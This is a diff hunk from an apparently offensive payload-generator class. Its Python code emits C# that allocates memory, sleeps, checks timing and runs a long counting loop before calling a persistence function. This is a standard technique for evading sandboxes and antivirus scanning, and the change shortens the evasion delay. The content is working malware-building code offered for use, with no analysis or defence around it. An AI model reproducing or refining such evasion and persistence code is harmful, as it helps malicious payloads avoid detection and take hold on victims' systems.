@@ -143,7 +143,7 @@ class Payload:
         payloadCode += "static void Main() 	{\n"
         payloadCode += "IntPtr %s = Marshal.AllocHGlobal(400000000); int %s = 100000000; int %s = 0;\n" %(hglobal,MAX_OP,cpt)
         payloadCode += "if (%s != null ) { \n" %(hglobal)               
-        payloadCode += "var %s = DateTime.Now.Millisecond; Thread.Sleep(32000); var %s = DateTime.Now.Millisecond;\n" %(time1,time2)
+        payloadCode += "var %s = DateTime.Now.Millisecond; Thread.Sleep(25000); var %s = DateTime.Now.Millisecond;\n" %(time1,time2)
         payloadCode += "if ((%s < (%s + 120000))) { for (int i = 0; i < %s+1; i++)\n" %(time2,time1,MAX_OP)
         payloadCode += "{%s++; if (%s == %s) {\n" %(cpt,cpt,MAX_OP)
         payloadCode += 	"%s(); %s = Marshal.AllocCoTaskMem(0);}}}}}\n" %(persistanceFuncName,hglobal)      
